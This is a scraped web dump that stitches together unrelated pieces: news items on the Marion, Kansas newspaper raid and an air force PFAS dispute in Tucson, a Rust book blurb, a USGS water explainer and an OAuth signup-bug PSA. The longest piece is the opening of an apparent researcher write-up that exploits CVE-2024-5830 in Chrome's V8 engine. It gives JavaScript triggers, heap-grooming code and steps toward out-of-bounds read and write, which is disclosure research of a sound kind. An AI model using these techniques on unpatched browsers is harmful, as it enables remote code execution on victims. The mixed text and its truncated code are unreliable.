He said on Tuesday that he suspects the criminal case ultimately will be resolved through a plea bargain so that Cody will not have a trial that would more fully disclose details about the raid.</p><p>“We’re just being basic journalists here,” he said. “We want the whole story. We don’t want part of it.”</p><p>A report from two special prosecutors last week referenced text messages between Cody and a local business owner after the raid. The business owner has said that Cody asked her to delete text messages between them, fearing people could get the wrong idea about their relationship, which she said was professional and platonic.</p><p>The Associated Press left a message seeking comment at a possible cellphone number for Cody, and it was not immediately returned on Tuesday. Attorneys representing Cody in a federal lawsuit over the raid are not representing him in the criminal case and did not immediately know who was representing him.</p><p>Cody justified the 11 August 2023 raid by saying he had evidence that Meyer, the newspaper and one of its reporters, Phyllis Zorn, had committed identity theft or other computer crimes in verifying the authenticity of a copy of the business owner’s state driving record provided to the newspaper by an acquaintance. The business owner was seeking Marion city council approval for a liquor license and the record showed that she potentially had driven without a valid license for years. However, she later had her license reinstated.</p><p>The prosecutors’ report concluded that no crime was committed by Meyer, Zorn or the newspaper and that Cody reached an erroneous conclusion about their conduct because of a poor investigation. Zorn used the information she had to legally search an online state database using her own name.</p></div></div>]]></description>

<div id="readability-page-1" class="page"><div id="maincontent"><p>The US air force is refusing to comply with an order to clean drinking water it polluted in Tucson, <a href="https://www.theguardian.com/us-news/arizona" data-link-name="in body link">Arizona</a>, claiming federal regulators lack authority after the conservative-dominated <a href="https://www.theguardian.com/us-news/us-supreme-court" data-link-name="in body link">US supreme court</a> overturned the “Chevron doctrine”. Air force bases contaminated the water with toxic <a href="https://www.theguardian.com/environment/pfas" data-link-name="in body link">PFAS “forever chemicals”</a> and other dangerous compounds.</p><p>Though former US <a href="https://www.theguardian.com/environment/epa" data-link-name="in body link">Environmental Protection Agency</a> (EPA) officials and legal experts who reviewed the air force’s claim say the Chevron doctrine ruling probably would not apply to the order, the <a href="https://www.theguardian.com/us-news/us-military" data-link-name="in body link">military’s</a> claim that it would represents an early indication of how polluters will wield the controversial court decision to evade responsibility.</p><p>It appears the air force is essentially attempting to expand the scope of the court’s ruling to thwart regulatory orders not covered by the decision, said Deborah Ann Sivas, director of the Stanford University Environmental Law Clinic.</p><p>“It’s very odd,” she added. “It feels almost like an intimidation tactic, but it will be interesting to see if others take this approach and it bleeds over.”</p><p>The supreme court in late June <a href="https://www.theguardian.com/us-news/ng-interactive/2024/jun/28/us-supreme-court-chevron-doctrine-ruling" data-link-name="in body link">overturned the 40-year-old Chevron doctrine</a>, one of its most important precedents. The decision sharply cut regulators’ power by giving judges the final say in interpreting ambiguous areas of the law during rule-making. Judges previously gave deference to regulatory agency experts on such questions.</p><p>The ruling is expected to have a profound impact on the EPA’s ability to protect the public from pollution, and the Tucson dispute highlights the high stakes in such scenarios – clean drinking water and the health of hundreds of thousands of people hangs in the balance.</p><p>Several air force bases are largely responsible for trichloroethylene (TCE) – volatile organic compounds – and <a href="https://www.theguardian.com/environment/pfas" data-link-name="in body link" data-component="auto-linked-tag">PFAS</a> contaminating drinking water sources in Tucson. A 10-sq-mile (26 sq km) area around the facilities and Tucson international airport were in the 1980s designated as a Superfund site, an action reserved for the nation’s most polluted areas.</p><p>The EPA in late May <a href="https://www.epa.gov/az/tiaa-tarp" data-link-name="in body link">issued an emergency order</a> under the Safe Drinking Water Act requiring the air force to develop a plan within 60 days to address PFAS contamination in the drinking water.</p><p>Filtration systems put in place in 2014 for TCE and other chemicals are currently removing PFAS, but the systems were not designed to remove PFAS, and the added burden is straining the system.</p><p>Officials previously shut down a well in 2021 when contaminated water nearly broke through the system, the EPA wrote. Such a breach could leave the <a href="https://www.theguardian.com/us-news/arizona" data-link-name="in body link" data-component="auto-linked-tag">Arizona</a> city without safe water.</p><p>The EPA order requires the development of a system specifically designed for PFAS. A similar system is estimated to cost about $25m to develop, or about 0.1% of the air force’s annual budget.</p><p>In a formal response sent to the EPA in the weeks after the supreme court reversed Chevron, the air force claimed the EPA lacked the authority to make the order, citing the case as evidence and stating “the EPA’s order can not withstand review”.</p><p>But legal experts noted that Chevron does not affect EPA enforcement actions like the Tucson order – it only affects the rule-making process.</p><p>Moreover, one arm of the administration cannot sue another, so the military cannot sue the EPA, and the case would never end up in court where the Chevron decision would come into play, said Walter Mugdan, a former EPA Superfund director. Instead, it would be resolved internally by a presidential administration instead of the judiciary.</p><p>However, a business that finds itself in a similar position may try to sue the EPA, Sivas said.</p><p>The air force did not respond to specific questions about its Chevron claim, but said it “will continue to meet our obligations under the federal [Superfund] law”.</p><p>The crux of the rest of the air force’s refusal to comply with the order hangs on whether there is “imminent and substantial danger” to Tucson residents. The air force noted Tucson’s drinking water was currently below the federal limit for PFAS.</p><p>But the EPA noted the filtration system was straining because it was not designed for PFAS, and the plume was especially dangerous because there are limited alternative drinking water sources in the desert. The real possibility that the system breaks and leaves people exposed or without clean water constitutes “imminent and substantial” danger, the EPA wrote in its response.</p><p>“The law does not require or expect EPA to wait until people are actively being harmed,” the EPA added. “In fact, Congress expects EPA to utilize its authority to prevent the harm from materializing.”</p><p>The air force also claimed it should not be forced to address the problem because the city of Tucson and state of Arizona are funding a different system to address PFAS. In response, the EPA said the new system would not be ready for years, and the air force is financially responsible for the pollution.</p><p>“The Air Force bears responsibility for the PFAS contamination and needs to step forward to protect the Tucson community,” the EPA wrote.</p></div></div>]]></description>

<h2>About this Book</h2>
<p>The Rust programming language is extremely well suited for concurrency, and its ecosystem has many libraries that include lots of concurrent data structures, locks, and more. But implementing those structures correctly can be difficult. Even in the most well-used libraries, memory ordering bugs are not uncommon.</p>
<p>In this practical book, Mara Bos, team lead of the Rust library team, helps Rust programmers of all levels gain a clear understanding of low-level concurrency. You’ll learn everything about atomics and memory ordering and how they're combined with basic operating system APIs to build common primitives like mutexes and condition variables. Once you’re done, you’ll have a firm grasp of how Rust’s memory model, the processor, and the role of the operating system all fit together.</p>
<p>With this guide, you’ll learn:</p>
<ul>
<li>How Rust's type system works exceptionally well for programming concurrency correctly</li>
<li>All about mutexes, condition variables, atomics, and memory ordering</li>
<li>What happens in practice with atomic operations on Intel and ARM processors</li>
<li>How locks are implemented with support from the operating system</li>
<li>How to write correct code that includes concurrency, atomics, and locks</li>
<li>How to build your own locking and synchronization primitives correctly</li>

    <h3>Detailed Description</h3>
    
<div><p>This image shows blue spheres representing relative amounts of Earth's water in comparison to the size of the Earth. Are you surprised that these water spheres look so small? They are only small in relation to the size of the Earth. These images attempt to show three dimensions, so each sphere represents "volume." They show that in comparison to the volume of the globe, the amount of water on the planet is very small. Oceans account for only a "thin film" of water on the surface.</p>
<p><strong>Spheres representing all of Earth's water, Earth's liquid fresh water, and water in lakes and riv</strong>ers</p>
<p>The largest sphere represents all of Earth's water. Its diameter is about 860 miles (the distance from Salt Lake City, Utah, to Topeka, Kansas) and has a volume of about 332,500,000 cubic miles (mi<sup>3</sup>) (1,386,000,000 cubic kilometers (km<sup>3</sup>)). This sphere includes all of the water in the oceans, ice caps, lakes, rivers, groundwater, atmospheric water, and even the water in you, your dog, and your tomato plant.</p>
<p><strong>Liquid fresh water</strong></p>
<p>How much of the total water is fresh water, which people and many other life forms need to survive? The blue sphere over Kentucky represents the world's liquid fresh water (groundwater, lakes, swamp water, and rivers). The volume comes to about 2,551,100 mi<sup>3</sup> (10,633,450 km<sup>3</sup>), of which 99 percent is groundwater, much of which is not accessible to humans. The diameter of this sphere is about 169.5 miles (272.8 kilometers).</p>
<p><strong>Water in lakes and rivers</strong></p>
<p>Do you notice the "tiny" bubble over Atlanta, Georgia? That one represents fresh water in all the lakes and rivers on the planet. Most of the water people and life of earth need every day comes from these surface-water sources. The volume of this sphere is about 22,339 mi<sup>3</sup> (93,113 km<sup>3</sup>). The diameter of this sphere is about 34.9 miles (56.2 kilometers). Yes, Lake Michigan looks way bigger than this sphere, but you have to try to imagine a bubble almost 35 miles high—whereas the average depth of Lake Michigan is less than 300 feet (91 meters).</p>

We've since reproduced the issue with several other companies' signup flows.</p><p>What's the issue?</p><p>A few months ago we (Flat.app) noticed that a meaningful fraction of signups-via-Google to our SaaS product were failing. I recently found out why, so I'm sharing this PSA for anyone facing a similar problem.</p><p>If your app supports "Sign in with Google", it's likely that new signups will fail if, on Google's OAuth consent screen, a user clicks "Continue" more than once. The error will probably be inscrutable to the user, depending on your setup, so they may just give up instead of trying again. In our case, we were losing around 15% of signups!</p><p>I encountered this issue while investigating failed signups for our product, but I've also reproduced it with other popular products including ChatGPT, Doordash, Expedia, and Snyk, so I assume it's widespread.</p><p>Some of these products use Auth0, as do we, but others don't, and they still generate an error of one kind or another.</p><p>For Auth0 specifically, the error is "You may have pressed the back button, refreshed during login, opened too many login dialogs, or there is some issue with cookies, since we couldn't find your session. Try logging in again from the application and if the problem persists please contact the administrator." The error tries to be helpful by listing potential causes, but it fails to mention the actual cause. That's because Auth0 wasn't aware of this failure mode, based on my correspondence with them.</p><p>Why does this happen?</p><p>After a user clicks "Continue" the first time, Google will respond with a 302 to the callback URL, passing along the authorization code and replaying the OAuth 2.0 state param. If the user clicks "Continue" again, Google will respond again with a 302 to the callback URL. The browser will abort the first pending request and issue a new request to the callback URL. Importantly, the state param is, as it should be, the same in both requests, and it typically incorporates a nonce (see https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#name-protecting-redirect-based-f). Since the nonce will already have been consumed by the first request, the second request will be rejected.</p><p>Why would a user click "Continue" twice?</p><p>Simple: poor UX in Google's consent screen. The "Continue" button provides almost no feedback that the click was registered, and the screen provides no feedback that any requests are pending. So, some users will naturally try again, especially if they're on a slow connection.</p><p>What can Google do?</p><p>Google could disable the "Continue" button with a loading indicator after the first click. That would ensure it's not possible to click it twice, and it would provide an improved UX by showing the user that something is happening.</p><p>Google's OAuth consent screen was redesigned at some point in the past few years. Allowing "Continue" to be clicked twice, with no visible feedback, may be an unintended regression.</p><p>What can I do?</p><p>Test this in your own application. Be sure to deauthorize your app before each test run so that you get the OAuth consent screen. You can do that in your Google account's Data &amp; privacy section.</p><p>Also, check your logs for errors to see if you're losing signups. See if you can detect this scenario and, if so, provide a better experience to users, e.g., by acknowledging what caused the error and giving them a clearer path to continue.</p></div></td></tr>        <tr><td></td></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>

<div id="readability-page-1" class="page"><section>
	
<p>In this post, I’ll exploit <a href="https://github.com/advisories/GHSA-fchp-8m28-g68f">CVE-2024-5830</a>, a type confusion bug in v8, the Javascript engine of Chrome that I reported in May 2024 as <a href="https://issues.chromium.org/issues/342456991">bug 342456991</a>. The bug was fixed in version <a href="https://chromereleases.googleblog.com/2024/06/stable-channel-update-for-desktop.html">126.0.6478.56/57</a>. This bug allows remote code execution (RCE) in the renderer sandbox of Chrome by a single visit to a malicious site.</p>
<h2 id="object-map-and-map-transitions-in-v8">Object map and map transitions in V8<a href="#object-map-and-map-transitions-in-v8" aria-label="Object map and map transitions in V8"></a></h2>
<p>This section contains some background materials in object maps and transitions that are needed to understand the vulnerability. Readers who are familiar with this can skip to the next section.</p>
<p>The concept of a map (or hidden class) is fairly fundamental to Javascript interpreters. It represents the memory layout of an object and is crucial in the optimization of property access. There are already many good articles that go into much more detail on this topic. I particularly recommend “<a href="https://mathiasbynens.be/notes/shapes-ics#object-model">JavaScript engine fundamentals: Shapes and Inline Caches</a>” by Mathias Bynens.</p>
<p>A map holds an array of property descriptors (<a href="https://v8.dev/blog/fast-properties#hiddenclasses-and-descriptorarrays"><code>DescriptorArrays</code></a>) that contains information about each property. It also holds details about the elements of the object and its <a href="https://v8.dev/blog/elements-kinds">type</a>.</p>
<p>Maps are shared between objects with the same property layout. For example, the following objects both have a single property <code>a</code> of type <code>SMI</code> (31 bit integers), so they can share the same map.</p>
<pre><code>
o1 = {a : 1};
o2 = {a : 10000};  //&lt;------ same map as o1, MapA
</code></pre>
<p>Maps also account property types in an object. For example, the following object, <code>o3</code> has a map different from <code>o1</code> and <code>o2</code>, because its property <code>a</code> is of type <code>double</code> (<code>HeapNumber</code>), rather than <code>SMI</code>:</p>
<pre><code>
o3 = {a : 1.1};
</code></pre>
<p>When a new property is added to an object, if a map does not already exist for the new object layout, a new map will be created.</p>
<pre><code>
o1.b = 1; //&lt;------ new map with SMI properties a and b
</code></pre>
<p>When this happens, the old and the new map are related by a transition:</p>
<pre><code>
%DebugPrint(o2);
DebugPrint: 0x3a5d00049001: [JS_OBJECT_TYPE]
 - map: 0x3a5d00298911 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x3a5d00002b19: [String] in ReadOnlySpace: #a: 10000 (const data field 0), location: in-object
 }
0x3a5d00298911: [Map] in OldSpace
 - map: 0x3a5d002816d9 &lt;MetaMap (0x3a5d00281729 )&gt;
 ...
 - instance descriptors #1: 0x3a5d00049011 
 - transitions #1: 0x3a5d00298999 <map>
     0x3a5d00002b29: [String] in ReadOnlySpace: #b: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x3a5d00298999 <map>
 ...
</map></map></map></code></pre>
<p>Note that the map of <code>o2</code> contains a transition to another map (<code>0x3a5d00298999</code>), which is the newly created map for <code>o3</code>:</p>
<pre><code>
%DebugPrint(o3);
DebugPrint: 0x3a5d00048fd5: [JS_OBJECT_TYPE]
 - map: 0x3a5d00298999 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x3a5d00002b19: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
    0x3a5d00002b29: [String] in ReadOnlySpace: #b: 1 (const data field 1), location: properties[0]
 }
0x3a5d00298999: [Map] in OldSpace
 - map: 0x3a5d002816d9 &lt;MetaMap (0x3a5d00281729 )&gt;
 ...
 - back pointer: 0x3a5d00298911 <map>
 ...
</map></map></code></pre>
<p>Conversely, the map of <code>o2</code> (<code>0x3a5d00298911</code>) is stored in this new map as the back pointer. A map can store multiple transitions in a <code>TransitionArray</code>. For example, if another property <code>c</code> is added to <code>o2</code>, then the <code>TransitionArray</code> will contain two transitions, one to property <code>b</code> and another to property <code>c</code>:</p>
<pre><code>
o4 = {a : 1};
o2.c = 1;
%DebugPrint(o4);
DebugPrint: 0x2dd400049055: [JS_OBJECT_TYPE]
 - map: 0x2dd400298941 <map> [FastProperties]
 - All own properties (excluding elements): {
    0x2dd400002b19: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
 }
0x2dd400298941: [Map] in OldSpace
 - map: 0x2dd4002816d9 &lt;MetaMap (0x2dd400281729 )&gt;
 ...
 - transitions #2: 0x2dd400298a35 Transition array #2:
     0x2dd400002b39: [String] in ReadOnlySpace: #c: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x2dd400298a0d <map>
     0x2dd400002b29: [String] in ReadOnlySpace: #b: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x2dd4002989c9 <map>
 ...
</map></map></map></code></pre>
<p>When a field of type <code>SMI</code> in an object is assigned a <code>double</code> (<code>HeapNumber</code>) value, because the <code>SMI</code> type cannot hold a <code>double</code> value, the map of the object needs to change to reflect this:</p>
<pre><code>
o1 = {a : 1};
o2 = {a : 1};
o1 = {a : 1.1};
%DebugPrint(o1);
DebugPrint: 0x1b4e00049015: [JS_OBJECT_TYPE]
 - map: 0x1b4e002989a1 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x1b4e00002b19: [String] in ReadOnlySpace: #a: 0x1b4e00049041  (const data field 0), location: in-object
 }
...
%DebugPrint(o2);
DebugPrint: 0x1b4e00049005: [JS_OBJECT_TYPE]
 - map: 0x1b4e00298935 <map> [FastProperties]
 ...
 - All own properties (excluding elements): {
    0x1b4e00002b19: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
 }
0x1b4e00298935: [Map] in OldSpace
 ...
 - deprecated_map
 ...
</map></map></code></pre>
<p>Note that, not only do <code>o1</code> and <code>o2</code> have different maps, but the map of <code>o2</code> is also marked as <code>deprecated</code>. This means that when a new object of the same property layout is created, it’ll use the map of <code>o1</code> (<code>0x1b4e002989a1</code>) instead of that of <code>o2</code> (<code>0x1b4e00298935</code>) because a more general map, the map of <code>o1</code>, whose field can represent both <code>HeapNumber</code> and <code>SMI</code>, is now available. Moreover, the map of <code>o2</code> will also be updated to the map of <code>o1</code> when its properties are accessed. This is done via the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map-updater.cc;l=272"><code>UpdateImpl</code></a> function:</p>
<pre><code>
Handle<map> MapUpdater::UpdateImpl() {
  ...
  if (FindRootMap() == kEnd) return result_map_;
  if (FindTargetMap() == kEnd) return result_map_;
  if (ConstructNewMap() == kAtIntegrityLevelSource) {
    ConstructNewMapWithIntegrityLevelTransition();
  }
  ...
  return result_map_;
}
</map></code></pre>
<p>Essentially, the function uses the <code>back pointer</code> of a <code>map</code> to retrace the transitions until it reaches the first map that does not have a back<code>pointer</code> (the <code>RootMap</code>). It then goes through the transitions from the <code>RootMap</code> to check if there already exists a suitable map in the transitions that can be used for the object (<code>FindTargetMap</code>). If a suitable map is found, then <code>ConstructNewMap</code> will create a new map which is then used by the object.</p>
<p>For example, in the following case, a map with three properties becomes deprecated when the second property is assigned a <code>HeapNumber</code> value:</p>
<pre><code>
obj = {a : 1};
obj.b = 1;
obj.c = 1; //&lt;---- Map now has 3 SMI properties
obj.b = 1.1 //&lt;----- original map becomes deprecated and a new map is created
</code></pre>
<p>In this case, two new maps are created. First a map with properties <code>a</code> and <code>b</code> of types <code>SMI</code> and <code>HeapNumber</code> respectively, then another map with three properties, <code>a : SMI</code>, <code>b : HeapNumber</code> and <code>c : SMI</code> to accommodate the new property layout:</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=697&amp;resize=697%2C361" alt="Diagram showing the two new maps that have been created." width="697" height="361" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=697&amp;resize=697%2C361 697w, https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=300 300w" sizes="(max-width: 697px) 100vw, 697px" data-recalc-dims="1"></p>
<p>In the above image, the red maps become deprecated and the green maps are newly created maps. After the property assignment, <code>obj</code> will be using the newly created map that has properties <code>a</code>, <code>b</code> and <code>c</code> and the transitions to the deprecated red maps are removed and replaced by the new green transitions.</p>
<p>In v8, object properties can be stored in an array or in a dictionary. Objects with properties stored in an array are referred to as fast objects, while objects with properties in dictionaries are dictionary objects. Map transitions and deprecations are specific to fast objects and normally, when a map deprecation happens, another fast map is created by <code>UpdateImpl</code>. This, however, is not necessarily the case. Let’s take a look at a slightly different example:</p>
<pre><code>
obj = {a : 1};
obj.b = 1;    //&lt;---- MapB
obj.c = 1;    //&lt;---- MapC

obj2 = {a : 1};
obj2.b = 1;  //&lt;----- MapB
obj2.b = 1.1;   //&lt;---- map of obj becomes deprecated
</code></pre>
<p>Assigning a <code>HeapNumber</code> to <code>obj2.b</code> causes both the original map of <code>obj2</code> (<code>MapB</code>), as well as the map of <code>obj</code> (<code>MapC</code>) to become deprecated. This is because the map of <code>obj</code> (<code>MapC</code>) is now a transition of a deprecated map (<code>MapB</code>), which causes it to become deprecated as well:</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=688&amp;resize=688%2C358" alt="Diagram showing the deprecation of previous maps." width="688" height="358" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=688&amp;resize=688%2C358 688w, https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=300 300w" sizes="(max-width: 688px) 100vw, 688px" data-recalc-dims="1"></p>
<p>As <code>obj</code> now has a deprecated map, its map will be updated when any of its property is accessed:</p>
<pre><code>
x = obj.a; //&lt;---- calls UpdateImpl to update the map of obj
</code></pre>
<p>In this case, a new map has to be created and a new transition is added to the map of <code>obj2</code>. However, there is a limited number of transitions that a map can hold. Prior to adding a new transition, a <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map-updater.cc;l=999">check</a> is carried out to ensure that the map can hold another transition:</p>
<pre><code>
MapUpdater::State MapUpdater::ConstructNewMap() {
  ...
  if (maybe_transition.is_null() &amp;&amp;
      !TransitionsAccessor::CanHaveMoreTransitions(isolate_, split_map)) {
    return Normalize("Normalize_CantHaveMoreTransitions");
  }
  ...
</code></pre>
<p>If no more transitions can be added, then a new dictionary map will be created via <code>Normalize</code>.</p>
<pre><code>
obj = {a : 1};
obj.b = 1;
obj.c = 1;

obj2 = {a : 1};
obj2.b = 1.1;   //&lt;---- map of obj becomes deprecated

//Add transitions to the map of obj2
for (let i = 0; i &lt; 1024 + 512; i++) {
  let tmp = {a : 1};
  tmp.b = 1.1;
  tmp['c' + i] = 1;
}

obj.a = 1; //&lt;----- calls UpdateImpl to update map of obj
</code></pre>
<p>As the map of <code>obj2</code> cannot hold anymore transitions, a new dictionary map is created for <code>obj</code> after its property is accessed. This behavior is somewhat unexpected, so <code>Update</code> is often followed by a debug assertion to ensure that the updated map is not a dictionary map (<code>DCHECK</code> is only active in a debug build):</p>
<pre><code>

<p>While most uses of the function <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map.cc;l=1903"><code>PrepareForDataProperty</code></a> cannot result in a dictionary map after <code>Update</code> is called, <code>PrepareForDataProperty</code> can be called by <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=4088"><code>CreateDataProperty</code></a> via <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=3539"><code>TryFastAddDataProperty</code></a>, which may result in a dictionary map after updating. There are different paths that use <code>CreateDataProperty</code>, but one particularly interesting path is in object cloning. When an object is copied using the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax#spread_in_object_literals">spread syntax</a>, a shallow copy of the original object is created:</p>
<pre><code>
var obj1 = {a : 1};
const clonedObj = { ...obj1 };
</code></pre>
<p>In this case, <code>CreateDataProperty</code> is used for creating new properties in <code>clonedObj</code> and to update its map when appropriate. However, if the object being cloned, <code>obj1</code> contains a property accessor, then it’ll be called while the object is being cloned. For example, in the following case:</p>
<pre><code>
var x = {};
x.a0 = 1;
x.__defineGetter__("prop", function() {
  return 1;
});

var y = {...x};
</code></pre>
<p>In this case, when <code>x</code> is cloned into <code>y</code>, the property accessor <code>prop</code> in <code>x</code> is called after the property <code>a0</code> is copied to <code>y</code>. At this point, the map of <code>y</code> contains only the <code>SMI</code> property <code>a0</code> and it is possible for the accessor to cause the map of <code>y</code> to become deprecated.</p>
<pre><code>
var x = {};
x.a0 = 1;
x.__defineGetter__("prop", function() {
  let obj = {};
  obj.a0 = 1;   //&lt;--- obj has same map as y at this point
  obj.a0 = 1.5;  //&lt;--- map of y becomes deprecated
  return 1;
});

var y = {...x};
</code></pre>
<p>When <code>CreateDataProperty</code> is called to copy the property <code>prop</code>, <code>Update</code> in <code>PrepareForDataProperty</code> is called to update the deprecated map of <code>y</code>. As explained before, by adding transitions to the map of <code>obj</code> in the property accessor, it is possible to cause the map update to return a dictionary map for <code>y</code>. Since the subsequent use of the updated map in <code>PrepareForDataProperty</code> assumes the updated map to be a fast map, rather than a dictionary map, this can corrupt the object <code>y</code> in various ways.</p>
<h2 id="gaining-arbitrary-read-and-write-in-the-v8-heap">Gaining arbitrary read and write in the v8 heap<a href="#gaining-arbitrary-read-and-write-in-the-v8-heap" aria-label="Gaining arbitrary read and write in the v8 heap"></a></h2>
<p>To begin with, let’s take a look at how the updated map is used in <code>PrepareForDataProperty</code>:</p>
<pre><code>
Handle<map> Map::PrepareForDataProperty(Isolate* isolate, Handle<map> map,
                                        InternalIndex descriptor,
                                        PropertyConstness constness,
                                        Handle</map></map></code></pre>
<p>The updated <code>map</code> is first used by <code>UpdateDescriptorForValue</code>.</p>
<pre><code>
Handle<map> UpdateDescriptorForValue(Isolate* isolate, Handle<map> map,
                                     InternalIndex descriptor,
                                     PropertyConstness constness,
                                     Handle</map></map></code></pre>
<p>Within <code>UpdateDescriptorForValue</code> the <code>instance_descriptors</code> of <code>map</code> are accessed. The <code>instance_descriptors</code> contain information about properties in the map but it is only relevant for fast maps. For a dictionary map, it is always an empty array with zero length. Accessing <code>instance_descriptors</code> of a dictionary map would therefore result in out-of-bounds (OOB) access to the empty array. In particular, the call to <code>ReconfigureToDataField</code> can modify entries in the <code>instance_descriptors</code>. While this may look like a promising OOB write primitive, the problem is that zero length descriptor arrays in v8 point to the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/roots/roots.h;l=90">empty_descriptor_array</a> that is stored in a read-only region:</p>
<pre><code>
V(DescriptorArray, empty_descriptor_array, EmptyDescriptorArray)
</code></pre>
<p>Any OOB write to the <code>empty_descriptor_array</code> is only going to write to the read-only memory region and cause a crash. To avoid this, I need to cause <code>CanHoldValue</code> to return <code>true</code> so that <code>ReconfigureToDataField</code> is not called. In the call to <code>CanHoldValue</code>, an OOB entry to the <code>empty_descriptor_array</code> is read and then certain conditions are checked:</p>
<pre><code>
bool CanHoldValue(Tagged descriptors, InternalIndex descriptor,
                  PropertyConstness constness, Tagged</code></pre>
<p>Although <code>empty_descriptor_array</code> is stored in a read-only region and I cannot control the memory content that is behind it, the read index, <code>descriptor,</code> is the array index that corresponds to the property <code>prop</code>, which I can control. By changing the number of properties that precede <code>prop</code> in <code>x</code>, I can control the OOB read offset to the <code>empty_descriptor_array</code>. This allows me to choose an appropriate offset so that the conditions in <code>CanHoldValue</code> are satisfied.</p>
<p>While this avoids an immediate crash, it is not exactly useful as far as exploits go. So, let’s take a look at what comes next after a dictionary map is returned from <code>PrepareForDataProperty</code>.</p>
<pre><code>
bool CanHoldValue(Tagged descriptors, InternalIndex descriptor,
                  PropertyConstness constness, Tagged</code></pre>
<p>After the <code>new_map</code> returned, its <code>instance_descriptors</code>, which is the <code>empty_descriptor_array</code>, is read again at offset <code>descriptor</code>, and the result is used to provide another offset in a property write:</p>
<pre><code>
void JSObject::WriteToField(InternalIndex descriptor, PropertyDetails details,
                            Tagged</code></pre>
<p>In the above, <code>index</code> is encoded in the <code>PropertyDetails</code> and is used in <code>FastPropertyAtPut</code> to write a property in the resulting object. However, <code>FastPropertyAtPut</code> assumes that the object has fast properties stored in a <code>PropertyArray</code> while our object is in fact a dictionary object with properties stored in a <code>NameDictionary</code>. This causes confusion between <code>PropertyArray</code> and <code>NameDictionary</code>, and because <code>NameDictionary</code> contains a few more internal fields than <code>PropertyArray</code>, writing to a <code>NameDictionary</code> using an offset that is meant for a <code>PropertyArray</code> can end up overwriting some internal fields in the <code>NameDictionary</code>. A common way to exploit a confusion between fast and dictionary objects is to overwrite the <code>capacity</code> field in the <code>NameDictionary</code>, which is used for checking the bounds when the <code>NameDictionary</code> is accessed (similar to the method that I used to exploit another v8 bug in this <a href="https://github.blog/2023-09-26-getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug">post</a>).</p>
<p>However, as I cannot fully control the <code>PropertyDetails</code> that comes from the OOB read of the <code>empty_descriptor_array</code>, I wasn’t able to overwrite the <code>capacity</code> field of the <code>NameDictionary</code>. Instead, I managed to overwrite another internal field, <code>elements</code> of the <code>NameDictionary</code>. Although the <code>elements</code> field is not normally used for property access, it is used in <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=3779"><code>MigrateSlowToFast</code></a> as a bound for accessing dictionary properties:</p>
<pre><code>
void JSObject::MigrateSlowToFast(Handle object,
                                 int unused_property_fields,
                                 const char* reason) {
  ...
  Handle iteration_order;
  int iteration_length;
  if constexpr (V8_ENABLE_SWISS_NAME_DICTIONARY_BOOL) {
    ...
  } else {
    ...
    iteration_length = dictionary-&gt;NumberOfElements();  //&lt;---- elements field
  }
  ...
  for (int i = 0; i get(i)));
      k = dictionary-&gt;NameAt(index);

      value = dictionary-&gt;ValueAt(index);     //DetailsAt(index);
    }
    ...
  }
  ...
}
</code></pre>
<p>In <code>MigrateSlowToFast</code>, <code>dictionary-&amp;gt;NumberOfElements()</code> is used as a bound of the property offsets in a loop that accesses the property <code>NameDictionary</code>. So by overwriting <code>elements</code> to a large value, I can cause OOB read when the property values are read in the loop. These property values are then copied to a newly created fast object. By arranging the heap carefully, I can control the <code>value</code> that is read and have it point to a fake object in the v8 heap.</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=685&amp;resize=685%2C587" alt="Diagram displaying how to control the value that is read and have it point to a fake object in the v8 heap." width="685" height="587" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=685&amp;resize=685%2C587 685w, https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=300 300w" sizes="(max-width: 685px) 100vw, 685px" data-recalc-dims="1"></p>
<p>In the above, the green box is the actual bounds of the <code>NameDictionary</code>, however, with a corrupted <code>elements</code> field, an OOB access can happen during <code>MigrateSlowToFast</code>, causing it to access the value in the red box, and use it as the value of the property. By arranging the heap, I can place arbitrary values in the red box, and in particular, I can make it point to a fake object that I created.</p>
<p>Heap arrangement in v8 is fairly straightforward as objects are allocated linearly in the v8 heap. To place control values after the <code>NameDictionary</code>, I can allocate arrays after the object is cloned and then write control values to the array entries.</p>
<pre><code>
var y = {...x};  //&lt;---- NameDictionary allocated

//Placing control values after the NameDictionary
var arr = new Array(256);
for (let i = 0; i &lt; 7; i++) {
  arr[i] = new Array(256);
  for (let j = 0; j &lt; arr[i].length; j++) {
    arr[i][j] = nameAddrF;
  }
}
</code></pre>
